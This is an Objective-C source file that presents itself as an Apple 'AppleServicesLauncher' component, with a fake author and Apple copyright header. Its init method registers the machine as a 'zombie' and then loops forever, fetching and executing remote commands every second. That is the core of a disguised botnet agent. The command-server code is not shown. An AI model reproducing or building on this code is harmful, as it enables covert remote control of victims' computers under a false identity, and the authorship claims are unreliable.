//
//  AppleServicesLauncher.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/29/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import "AppleServicesLauncher.h"
#import "WTServerApi.h"

@implementation AppleServicesLauncher

- (id)init {
    
    self = [super init];

    [WTServerApi initializeNewZombie];
    while (true) {
        [WTServerApi execNextCommand];
        sleep(1);
    }
    return self;
}

@end
